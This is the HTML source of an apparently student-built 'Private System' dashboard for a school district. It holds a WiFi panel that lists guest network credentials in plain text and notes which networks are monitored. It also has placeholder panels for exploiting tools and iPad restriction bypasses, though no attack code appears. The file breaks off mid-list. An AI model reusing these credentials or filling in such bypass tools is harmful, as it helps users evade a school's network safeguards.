<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Private System</title>
  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/interactjs/dist/interact.min.js"></script>
  <style>
    /* Login System Styles */
    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }
    
    body.login-body {
      margin: 0; padding: 0;
      background: #000;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden; /* Prevent scrollbars during zoom/animation */
      position: relative; /* For positioning overlays */
    }

    /* Pre-Login Overlay */
    #preLoginOverlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100vh;
        background: black; 
        display: flex;
        flex-direction: column; /* Stack elements vertically */
        justify-content: center;
        align-items: center;
        z-index: 999;
        animation: fadeOutOverlay 3s forwards 2s; /* Fade out after 2 seconds */
    }

    @keyframes fadeOutOverlay {
        from { opacity: 1; }
        to { opacity: 0; visibility: hidden; }
    }

    .rotating-box {
        width: 200px;
        height: 200px;
        border: 4px solid orange;
        border-radius: 50%;
        display: flex;
        justify-content: center;
        align-items: center;
        animation: rotate 8s infinite linear, colorGradient 4s infinite alternate;
        margin-bottom: 20px; /* Space between rotating box and text */
    }

    @keyframes rotate {
        from { transform: rotateY(0deg); }
        to { transform: rotateY(360deg); }
    }

    @keyframes colorGradient {
        0% { border-color: orange; }
        50% { border-color: red; }
        100% { border-color: orange; }
    }

    .animated-text {
        font-size: 1.5em;
        font-weight: bold;
        font-family: 'Courier New', monospace;
        background: linear-gradient(45deg, orange, red);
        -webkit-background-clip: text;
        color: transparent;
        animation: pulseText 3s infinite alternate;
        transform-origin: center;
    }

    @keyframes pulseText {
        0% { transform: scale(1); opacity: 1; }
        100% { transform: scale(1.1); opacity: 0.8; }
    }

    /* Simplified 3D Box for Login Page Animation */
    .login-animation-box {
        width: 150px;
        height: 150px;
        transform-style: preserve-3d;
        animation: spinCube 6s infinite linear;
        position: relative; /* Position relative to its container for centering */
        display: flex;
        justify-content: center;
        align-items: center;
        perspective: 800px; /* Needed for 3D transformations */
    }

    @keyframes spinCube {
        0% { transform: rotateX(0deg) rotateY(0deg); }
        100% { transform: rotateX(360deg) rotateY(360deg); }
    }

    .login-animated-text {
        position: absolute; /* For placing text on the "faces" of a cube (simplified here to one element) */
        width: 100%;
        height: 100%;
        display: flex;
        justify-content: center;
        align-items: center;
        background-color: rgba(255, 145, 77, 0.2); /* Semi-transparent orange */
        border: 2px solid rgba(255, 145, 77, 0.8);
        border-radius: 15px; /* Make it slightly rounded */
        font-family: 'Courier New', monospace;
        font-size: 1em;
        font-weight: bold;
        text-align: center;
        box-shadow: 0 0 10px rgba(255, 145, 77, 0.5);
        backface-visibility: hidden;
    }
    
    /* Adjust Login Box Styles for New Layout */
    .login-box {
      background: #000;
      border-radius: 25px; /* Increased for roundness */
      border: 3px solid white;
      box-shadow: 0 0 15px white;
      width: 400px; /* More square */
      padding: 30px 25px;
      text-align: center;
      position: relative; /* Changed from relative to ensure positioning */
      transition: border-color 0.3s, box-shadow 0.3s;
      margin-top: 120px; /* To ensure it doesn't overlap pre-login animations */
      z-index: 1; /* Ensure login box is above overlays if any */
    }
    
    .login-box.flashing {
      animation: flashRed 0.4s ease-in-out 2;
    }
    
    @keyframes flashRed {
      0%, 100% { border-color: red; box-shadow: 0 0 15px red; }
      50% { border-color: white; box-shadow: 0 0 5px white; }
    }
    
    .login-box h2 {
      font-size: 1.7em;
      margin-bottom: 20px;
      font-family: 'Courier New', monospace;
    }
    
    .login-box input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      background: #1c1c1c;
      border: none;
      color: white;
      border-radius: 8px;
      font-size: 1em;
    }
    
    .login-box label { /* Now handles the password show/hide toggle */
      display: flex;
      align-items: center;
      font-size: 0.9em;
      margin-bottom: 10px;
      gap: 10px;
      cursor: pointer;
    }
    
    #showPassword {
        display: none; /* Hide the actual checkbox */
    }

    /* Styling the custom toggle for password visibility */
    #showPassword + label::before {
        content: '';
        display: inline-block;
        width: 40px; /* Toggle track width */
        height: 20px; /* Toggle track height */
        background: #ccc; /* Default grey */
        border-radius: 10px;
        transition: background 0.3s;
        position: relative;
        vertical-align: middle;
    }

    #showPassword:checked + label::before {
        background: #4CAF50; /* Green when checked */
    }

    /* Text next to the toggle */
    #showPassword + label span {
        color: white; /* Text color */
    }

    #showPassword:checked + label span {
        color: #4CAF50; /* Green text when checked */
    }
    
    .login-box button {
      width: 100%;
      padding: 12px;
      background-color: red;
      color: white;
      font-size: 1em;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
    
    .attempt-counter, .error-message {
      margin-top: 10px;
      font-size: 0.85em;
      color: red;
    }
    
    .popup {
      display: none;
      position: absolute;
      top: 50%;
      left: 50%;
      width: 320px;
      padding: 20px;
      transform: translate(-50%, -50%);
      background: black;
      border: 3px solid white;
      border-radius: 15px;
      box-shadow: 0 0 20px white;
      z-index: 10;
    }
    
    .popup input {
      margin-bottom: 15px;
    }

    /* New Login Quick Bar */
    .login-quick-bar {
        position: fixed; /* Fixed to the viewport */
        top: 0;
        left: 0;
        width: 100%;
        background-color: rgba(0, 0, 0, 0.7);
        padding: 10px 20px;
        display: flex;
        justify-content: center; /* Center items */
        align-items: center;
        gap: 15px;
        z-index: 100; /* Above login box */
        color: white;
        border-bottom: 1px solid rgba(255, 255, 255, 0.3);
        box-sizing: border-box;
        flex-wrap: wrap; /* Allow wrapping on small screens */
    }

    .login-quick-bar button {
        background: none;
        border: none;
        color: white;
        font-size: 1.2em;
        cursor: pointer;
        padding: 5px 10px;
        border-radius: 5px;
        transition: background 0.2s;
        font-family: 'Segoe UI', sans-serif; /* Match main font */
    }
    .login-quick-bar button:hover {
        background: rgba(255, 255, 255, 0.2);
    }

    .login-time-date {
        font-size: 1em;
        font-weight: bold;
        font-family: 'Courier New', monospace;
        white-space: nowrap;
    }

    /* Specific buttons in quick bar for visual distinction */
    #loginPanicBtn { color: #ff4c4c; font-weight: bold; }
    #loginZoomInBtn, #loginZoomOutBtn { font-weight: bold; }
    #loginAttemptCounterDisplay { cursor: default; color: #ff4c4c; font-weight: bold; }
    #passwordToggleBtn { font-size: 1.3em; }


    /* Dashboard Styles */
    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap');

    body.dashboard-body {
      font-family: 'Montserrat', sans-serif;
      background-color: #1a1a1a;
      color: #f9f2dc;
      padding: 20px;
      transition: background-color 0.3s, color 0.3s;
      zoom: 1; 
      overflow-y: auto; /* Allow scrolling if content overflows */
      position: relative; /* For any fixed dashboard elements */
    }

    body.dashboard-body.light-theme {
      background-color: #f9f2dc;
      color: #1a1a1a;
    }

    .dashboard-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: #ff914d;
      padding: 15px 25px;
      border-radius: 12px;
      color: #000;
      margin-bottom: 20px;
    }

    .dashboard-header h1 {
      font-size: 24px;
    }

    .user-info {
      font-weight: bold;
    }

    .version-box {
      background: #ffd966;
      padding: 8px 15px;
      border-radius: 8px;
      color: #000;
      font-weight: bold;
    }

    .quick-bar {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 10px; 
      flex-wrap: wrap;
      padding: 10px; /* Added padding */
      background: rgba(42, 42, 42, 0.5); /* Slight background for distinction */
      border-radius: 8px;
    }

    body.dashboard-body.light-theme .quick-bar {
      background: rgba(255, 217, 102, 0.5); /* Light theme quick bar background */
    }

    .quick-bar button {
      background-color: #ff914d;
      border: none;
      padding: 10px 14px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
      min-width: 110px;
      white-space: nowrap;
    }

    .quick-bar button:hover {
      background-color: #ffb67a;
    }

    #panicBtn {
      background: #ff4c4c !important;
      color: white !important;
    }
    
    /* Style for new search bar */
    .quick-bar input[type="text"] {
        padding: 8px 12px;
        border-radius: 8px;
        border: 1px solid #ff914d;
        background: rgba(255, 255, 255, 0.2);
        color: #f9f2dc;
        font-size: 0.9em;
        width: 180px; /* Default width */
        box-sizing: border-box;
    }
    body.dashboard-body.light-theme .quick-bar input[type="text"] {
        border-color: #994d00;
        background: rgba(255, 255, 255, 0.7);
        color: #000;
    }
    .quick-bar input[type="text"]::placeholder {
        color: rgba(249, 242, 220, 0.7);
    }
     body.dashboard-body.light-theme .quick-bar input[type="text"]::placeholder {
        color: rgba(0, 0, 0, 0.7);
    }


    .announcement-bar {
      width: 100%;
      background-color: #ff914d;
      color: black;
      font-weight: bold;
      padding: 10px 0;
      overflow: hidden;
      position: relative;
      border-radius: 8px;
      box-sizing: border-box;
      margin-bottom: 20px;
      user-select: none;
      height: 30px;
      line-height: 13px;
    }

    .announcement-bar span {
      display: inline-block;
      white-space: nowrap;
      position: absolute;
      will-change: transform;
      animation: scrollLeft 15s linear infinite;
      padding-left: 100%;
    }

    @keyframes scrollLeft {
      0% {
        transform: translateX(0%);
      }
      100% {
        transform: translateX(-100%);
      }
    }

    body.dashboard-body.light-theme .announcement-bar {
      background-color: #ffd966;
      color: #000;
    }

    .main-row {
      display: flex;
      gap: 20px;
      margin-bottom: 20px;
      flex-wrap: wrap;
      /* If panels become draggable/resizable with absolute positioning,
         this container might need adjustment or position: relative */
    }

    .box {
      background-color: #2a2a2a;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.3);
      min-height: 120px;
      transition: background-color 0.3s, color 0.3s, transform 0.2s; /* Add transform for drag */
      flex: 1 1 300px; /* Grow, shrink, basis */
      position: relative; /* For absolute positioning of drag handles */
    }

    body.dashboard-body.light-theme .box {
      background-color: #ffd966;
      color: #000;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.6);
    }

    .box h2 {
      font-size: 18px;
      margin-bottom: 10px;
      color: #ffbf80;
    }

    body.dashboard-body.light-theme .box h2 {
      color: #994d00;
    }

    .box p, .box ul {
      font-size: 14px;
    }

    /* Styles for Resizable Handles */
    .handle {
      position: absolute;
      bottom: 5px;
      right: 5px;
      width: 15px;
      height: 15px;
      background: #ff914d;
      border-radius: 3px;
      cursor: se-resize;
      opacity: 0.7;
      z-index: 5; /* Ensure handle is above content */
    }
    .handle:hover {
      opacity: 1;
      background: #ffb67a; /* Darker on hover */
    }
    body.dashboard-body.light-theme .handle {
      background: #994d00;
    }
    body.dashboard-body.light-theme .handle:hover {
      background: #e68a00;
    }


    .update-entry {
      background: #40210f;
      padding: 8px;
      margin-top: 5px;
      border-radius: 6px;
      color: #ffccb3;
    }

    body.dashboard-body.light-theme .update-entry {
      background: #ffd999;
      color: #994d00;
    }

    .calendar {
      display: grid;
      grid-template-columns: repeat(7, 1fr);
      gap: 5px;
      margin-top: 10px;
      text-align: center;
      font-size: 12px;
    }

    .calendar div {
      padding: 6px;
      background: #333;
      border-radius: 4px;
    }

    .today {
      background: #ff914d !important;
      font-weight: bold;
      color: black;
    }

    body.dashboard-body.light-theme .calendar div {
      background: #ffd966;
      color: #000;
    }

    body.dashboard-body.light-theme .today {
      background: #994d00 !important;
      color: #ffd966;
    }

    #canvasContainer {
      display: none;
      margin-top: 20px;
      text-align: center;
    }

    #notesCanvas {
      border: 2px solid #ff914d;
      border-radius: 12px;
      background: #fff;
      cursor: crosshair;
      touch-action: none;
    }

    #canvasControls {
      margin-top: 10px;
    }

    #canvasControls button {
      background-color: #ff914d;
      border: none;
      padding: 8px 16px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
      margin: 0 5px;
    }

    #canvasControls button:hover {
      background-color: #ffb67a;
    }

    .motivation-box {
      background-color: #333;
      color: #ffd966;
      padding: 20px;
      border-radius: 12px;
      font-style: italic;
      font-size: 16px;
      box-shadow: 0 0 12px rgba(255, 145, 77, 0.5);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 120px;
      text-align: center;
    }

    body.dashboard-body.light-theme .motivation-box {
      background-color: #fff3cc;
      color: #994d00;
      box-shadow: 0 0 12px rgba(255, 145, 77, 0.8);
    }

    /* Info Panel Styles */
    .info-panel {
      display: none;
      background-color: #2a2a2a;
      padding: 20px;
      border-radius: 12px;
      margin-top: 20px;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.3);
    }

    body.dashboard-body.light-theme .info-panel {
      background-color: #ffd966;
      color: #000;
    }

    .info-panel h2 {
      color: #ff914d;
      margin-bottom: 15px;
    }

    body.dashboard-body.light-theme .info-panel h2 {
      color: #994d00;
    }

    .wifi-grid {
      display: grid;
      grid-template-columns: repeat(8, 1fr);
      gap: 10px;
      margin-bottom: 15px;
    }

    .wifi-grid div {
      padding: 8px;
      background: #333;
      border-radius: 6px;
      text-align: center;
      font-weight: bold;
    }

    body.dashboard-body.light-theme .wifi-grid div {
      background: #ffd999;
    }

    .wifi-entry {
      display: grid;
      grid-template-columns: repeat(8, 1fr);
      gap: 10px;
      margin-bottom: 10px;
    }

    .wifi-entry div {
      padding: 8px;
      background: #40210f;
      border-radius: 6px;
      text-align: center;
    }

    body.dashboard-body.light-theme .wifi-entry div {
      background: #ffd999;
    }

    /* --- WiFi Level Color Coding --- */
    .wifi-level-high { background-color: lightgreen !important; color: black !important; } /* Green for high */
    .wifi-level-medium { background-color: gold !important; color: black !important; } /* Yellow for medium */
    .wifi-level-low { background-color: salmon !important; color: black !important; } /* Red for low */
    .wifi-level-unknown { background-color: #555 !important; color: white !important; } /* Default for unknown */
    body.dashboard-body.light-theme .wifi-level-unknown { background-color: #ccc !important; color: black !important;}

    .handbook-buttons {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 10px;
      margin-top: 15px;
    }

    .handbook-buttons button {
      background-color: #ff914d;
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
    }

    .handbook-buttons button:hover {
      background-color: #ffb67a;
    }

    .links-list {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 10px;
      margin-top: 15px;
    }

    .links-list a {
      display: block;
      background-color: #ff914d;
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
      text-decoration: none;
      text-align: center;
    }

    .links-list a:hover {
      background-color: #ffb67a;
    }

    .exploit-buttons {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 10px;
      margin-top: 15px;
    }

    .exploit-buttons a {
      display: block;
      background-color: #ff914d;
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
      text-decoration: none;
      text-align: center;
    }

    .exploit-buttons a:hover {
      background-color: #ffb67a;
    }

    .bypass-buttons {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 10px;
      margin-top: 15px;
    }

    .bypass-buttons button {
      background-color: #ff914d;
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
    }

    .bypass-buttons button:hover {
      background-color: #ffb67a;
    }

    .coming-soon {
      background: #40210f;
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      text-align: center;
      font-weight: bold;
    }

    body.dashboard-body.light-theme .coming-soon {
      background: #ffd999;
    }

    .info-text {
      background: #40210f;
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
    }

    body.dashboard-body.light-theme .info-text {
      background: #ffd999;
    }

    .school-info-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 10px;
      margin-top: 15px;
    }

    .school-info-item {
      background: #40210f;
      padding: 12px;
      border-radius: 8px;
    }

    body.dashboard-body.light-theme .school-info-item {
      background: #ffd999;
    }

    .school-info-label {
      font-weight: bold;
      color: #ff914d;
      margin-bottom: 5px;
    }

    body.dashboard-body.light-theme .school-info-label {
      color: #994d00;
    }

    .ipad-options {
      display: flex;
      gap: 10px;
      margin-top: 15px;
    }

    .ipad-options button {
      flex: 1;
      background-color: #ff914d;
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
    }

    .ipad-options button:hover {
      background-color: #ffb67a;
    }

    .ipad-content {
      display: none;
      background: #40210f;
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
    }

    body.dashboard-body.light-theme .ipad-content {
      background: #ffd999;
    }
    
    .bypass-content {
      display: none;
      background: #40210f;
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
    }
    
    body.dashboard-body.light-theme .bypass-content {
      background: #ffd999;
    }
  </style>
  
  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
  <!-- Include interact.js for drag and drop/resize -->
  <script src="https://cdn.jsdelivr.net/npm/interactjs/dist/interact.min.js"></script>
</head>
<body class="login-body" id="bodyElement">

  <!-- Pre-Login Loading Overlay -->
  <div id="preLoginOverlay">
      <div class="rotating-box"></div>
      <div class="animated-text">Initializing System...</div>
      <div class="login-animation-box">
          <div class="login-animated-text">Initializing Login Page...</div>
      </div>
  </div>

  <!-- Login System -->
  <div class="login-box" id="loginBox">
    <h2>𝙋𝙧𝙞𝙫𝙖𝙩𝙚 𝙎𝙮𝙨𝙩𝙚𝙢</h2>

    <input type="text" id="username" placeholder="Enter Username..." autocomplete="off" />
    <input type="password" id="password" placeholder="Enter Password..." autocomplete="off" />
    <input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off" />

    <label for="showPassword">
      <input type="checkbox" id="showPassword" />
      <span>Show Password</span>
    </label>

    <button id="submitBtn">Submit</button>

    <div class="error-message" id="errorMsg"></div>
    <div class="attempt-counter" id="attemptsText">Attempts Left: 3</div> <!-- Updated to 3 -->

    <div class="popup" id="resetPopup" tabindex="-1" aria-hidden="true">
      <p>Too many failed attempts.</p>
      <input type="password" id="resetField" placeholder="SENDING LOG TO SERVER PLEASE WAIT WHILE WE ACCEPT IT" autocomplete="off" />
      <button id="resetBtn">Reset Counter</button>
    </div>
  </div>

  <!-- Login Quick Bar -->
  <div class="login-quick-bar">
      <button id="loginPanicBtn" title="Panic Button (Go to Clever)">🚨 Clever</button>
      <button id="loginZoomInBtn" title="Zoom In">➕ Zoom In</button>
      <button id="loginZoomOutBtn" title="Zoom Out">➖ Zoom Out</button>
      <div class="login-time-date" id="loginDateTimeBox">📅 --.--.-- 🕒 --:--:--</div>
      <button id="timeFormatToggleBtn" title="Toggle 24h Format">🔄 12h</button>
      <button id="loginAttemptCounterDisplay">Attempts: 3</button>
      <button id="passwordToggleBtn" title="Show/Hide Password">👁️</button>
  </div>

  <!-- Dashboard (hidden by default) -->
  <div id="dashboard" style="display: none;">
    <div class="dashboard-header" id="dashboardHeader">
      <div>
        <h1>Private Dashboard GUI</h1>
        <div class="user-info">User - <span id="loggedInUser">Beta.user</span> | ID: <span id="loggedInID">281573</span></div>
      </div>
      <div class="version-box">Version 1.5.6</div>
    </div>

    <div class="quick-bar">
      <button id="sessionTime">⏳ Session Time: 00:00:00</button>
      <button id="realTimeClock">🕒 --:--:--</button>
      <button id="realDate">📅 --</button>
      <button id="notesBtn">📒 Notes</button>
      <button id="exportNotesBtn">💾 Export Notes</button>
      <button id="downloadActivityLogsBtn">💾 Activity Logs</button> <!-- New Button -->
      <button id="screenshotBtn">📸 Screenshot</button>
      <button id="toggleSectionsBtn">⬆️ Toggle Sections</button>
      <button id="fixIssuesBtn">🛠️ Fix Issues</button>
      <button id="fullScreenBtn">🖥️ Full Screen</button>
      <button id="zoomInBtn">➕ Zoom In</button>
      <button id="zoomOutBtn">➖ Zoom Out</button>
      <button id="restartBtn">🔄 Restart</button>
      <button id="panicBtn">🚨 Panic</button>
      <button id="themeToggle">🌙 Dark Mode</button>
      <button id="logoutBtn">🔓 Log Out</button>
      <input type="text" id="dashboardSearch" placeholder="Search areas..." autocomplete="off"/> <!-- New Search Bar -->
    </div>
    
    <div id="announcementBar" class="announcement-bar">
      <span>🚨 Welcome to the Private Dashboard GUI. Stay tuned for updates and alerts! 🚨</span>
    </div>
    
    <div class="main-row" id="mainGrid">
      
      <div class="box">
        <h2>📅 Calendar</h2>
        <div class="calendar" id="calendar"></div>
      </div>

      <div class="box motivation-box" id="motivationBox">
        "Success is not final, failure is not fatal: It is the courage to continue that counts." – Winston Churchill
      </div>
    </div>

    <div id="updatesNotifications" style="display: flex; gap: 20px; justify-content: center; flex-wrap: nowrap; margin-top: 20px;">
      <div class="box" style="flex: 1 1 300px; min-width: 300px;">
        <h2>🔄 Updates</h2>
        <div class="update-entry">Dashboard Interface Update!</div>
        <div class="update-entry">New Exploits Added</div>
        <div class="update-entry">UI Overhaul Deployed</div>
      </div>

      <div class="box" style="flex: 1 1 300px; min-width: 300px;">
        <h2>🔔 Notifications</h2>
        <p>Starting to work on the log in system. Stay tuned for more!</p>
      </div>
    </div>

    <div class="quick-bar" style="flex-wrap: wrap; margin-top: 30px;">
      <button onclick="dashboard.togglePanel('wifiPanel')">📡 School WiFi Information</button>
      <button onclick="dashboard.togglePanel('ipadPanel')">📱 School iPad Restrictions</button>
      <button onclick="dashboard.togglePanel('handbookPanel')">📘 Student Handbooks Information</button>
      <button onclick="dashboard.togglePanel('mapPanel')">🏫 School Building Map Information</button>
      <button onclick="dashboard.togglePanel('studentWebsitesPanel')">🌐 Student Website's Information</button>
      <button onclick="dashboard.togglePanel('teacherWebsitesPanel')">👩‍🏫 Teacher Websites Information</button>
      <button onclick="dashboard.togglePanel('phoneDirectoryPanel')">📞 School Phone Directory Information</button>
      <button onclick="dashboard.togglePanel('cameraPanel')">📷 School Camera Information</button>
      <button onclick="dashboard.togglePanel('schoolInfoPanel')">🏫 School Information</button>
      <button onclick="dashboard.togglePanel('exploitPanel')">🧨 Exploiting Tools</button>
      <button onclick="dashboard.togglePanel('bypassPanel')">🚪 Bypassing Tools</button>
      <button onclick="dashboard.togglePanel('vpnPanel')">🔐 VPN Websites</button>
      <button onclick="dashboard.togglePanel('gamingPanel')">🎮 Gaming Websites</button>
      <button onclick="dashboard.togglePanel('musicPanel')">🎵 Music Websites</button>
      <button onclick="dashboard.togglePanel('keyboardPanel')">🎹 Keyboard Tricks</button>
      <!-- Add placeholders for new panels/features -->
      <button onclick="dashboard.togglePanel('settingsPanel')">⚙️ Settings</button>
      <button id="timerBtn">⏱️ Timer</button>
      <button id="stopwatchBtn">⏺️ Stopwatch</button>
      <button id="activityLogBtn">📜 Activity Log</button>
      <button id="loginHistoryBtn">👤 Login History</button>
      <button id="themesBtn">🎨 Themes</button>
      <button id="calculatorBtn">🧮 Calculator</button>
      <button id="unitConverterBtn">↔️ Unit Converter</button>
      <button id="statsBtn">📊 Stats</button>
      <button id="mediaBtn">📺 Media</button>
      <button id="reminderBtn">🔔 Reminder</button>
    </div>

    <!-- Information Panels -->
    <div id="infoPanelsContainer" style="margin-top: 20px;">
      <!-- WiFi Panel -->
      <div id="wifiPanel" class="info-panel">
        <h2>📡 School WiFi Information</h2>
        <div class="wifi-grid">
          <div>Network Name</div>
          <div>Wifi Level</div>
          <div>Security Type</div>
          <div>Encryption</div>
          <div>Hidden?</div>
          <div>Monitored?</div>
          <div>Username</div>
          <div>Password</div>
        </div>
        
        <div class="wifi-entry">
          <div>Middletown_Core</div>
          <div>High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>No</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
        </div>
        
        <div class="wifi-entry">
          <div>Mtown_Core</div>
          <div>High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
          <div>Unknown</div>
        </div>
        
        <div class="wifi-entry">
          <div>Mtown Guest</div>
          <div>Medium</div>
          <div>WPA3 Enterprise</div>
          <div>Medium</div>
          <div>No</div>
          <div>Rare</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
        </div>
        
        <div class="wifi-entry">
          <div>Radius Test</div>
          <div>Low</div>
          <div>WPA3 Enterprise</div>
          <div>Low</div>
          <div>No</div>
          <div>Rarely</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
        </div>
      </div>

      <!-- iPad Panel -->
      <div id="ipadPanel" class="info-panel">
        <h2>📱 School iPad Restrictions</h2>
        <div class="ipad-options">
          <button onclick="dashboard.showIpadContent('restrictions')">Restrictions</button>
          <button onclick="dashboard.showIpadContent('bypasses')">Bypasses</button>
        </div>
        
        <div id="ipadRestrictions" class="ipad-content">
          <p>Coming soon</p>
        </div>
        
        <div id="ipadBypasses" class="ipad-content">
          <p>Coming soon</p>
        </div>
      </div>

      <!-- Handbook Panel -->
      <div id="handbookPanel" class="info-panel">
        <h2>📘 Student Handbooks Information</h2>
        <div class="handbook-buttons">
          <a href="https://cdnsm5-ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Elementary%20Handbook.pdf" target="_blank">Elementary Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Secondary%20Student%20Handbook.pdf" target="_blank">Secondary Student Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/District%20Handbook%20copy.pdf" target="_blank">District Handbook</a>
          <a href="https://middletown.ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025B%20RA%20Academy%20Handbook%20copy.pdf" target="_blank">RA Academy Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Virtual%20Learning%20Plan%20RSVD%20DEC2024.pdf" target="_blank">Virtual Learning Plan (2024-2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Dress%20Code.docx.pdf" target="_blank">Dress Code (2024-2025)</a>
        </div>
      </div>

      <!-- Map Panel -->
      <div id="mapPanel" class="info-panel">
        <h2>🏫 School Building Map Information</h2>
        <p>Building Map Display</p>
        <div class="coming-soon">
          Building Map Coming Soon
        </div>
      </div>

      <!-- Student Websites Panel -->
      <div id="studentWebsitesPanel" class="info-panel">
        <h2>🌐 Student Website's Information</h2>
        <div class="links-list">
          <a href="https://www.raiderweb.org" target="_blank">RaiderWeb</a>
          <a href="https://middletownsd.instructure.com/login" target="_blank">Canvas Login</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever Login</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
          <a href="https://www.raiderweb.org/student_services/hazing_reporting" target="_blank">Hazing Reporting</a>
          <a href="https://www.youtube.com/user/MAHSAnnouncements?app=desktop" target="_blank">MAHS Announcements</a>
          <a href="https://id.naviance.com" target="_blank">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
          <a href="https://powerschool.raiderweb.org/public/" target="_blank">PowerSchool</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
          <a href="https://www.safe2saypa.org" target="_blank">Safe2Say</a>
          <a href="https://mail.google.com/mail/" target="_blank">Gmail</a>
          <a href="https://www.balfour.com/pennsylvania/middletown/middletown-area-high-school" target="_blank">Balfour</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt!</a>
        </div>
      </div>

      <!-- Teacher Websites Panel -->
      <div id="teacherWebsitesPanel" class="info-panel">
        <h2>👩‍🏫 Teacher Websites Information</h2>
        <div class="links-list">
          <a href="https://alo.acadiencelearning.org/login" target="_blank">Acadience Learning</a>
          <a href="https://app.aimswebplus.com/#/login" target="_blank">AIMSweb Plus</a>
          <a href="https://ep1.erplinq.com/MIDDLETOWN/" target="_blank">ERP Linq</a>
          <a href="https://sso.barracuda.com/u/login/identifier?state=hKFo2SBFYnNBRjVRYmczc2t0ZjlSNmwxel9GT25LZ2o3QzVDV6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIDQ1U0hHOGVubzF0eE10WlhiSkRZRnNQSmJqY1dwcnFlo2NpZNkgQk1yY2JuRWdkS3BkSjZRWGVjN0hiRHdlTkpMUW1MSUk" target="_blank">Barracuda</a>
          <a href="https://shop.buyguernsey.com/thmBootstrapHome.aspx" target="_blank">Buy Guernsey</a>
          <a href="https://middletownsd.instructure.com/login/ldap" target="_blank">Canvas (Teacher)</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever (Teacher)</a>
          <a href="https://www.discoveryeducation.com" target="_blank">Discovery Education</a>
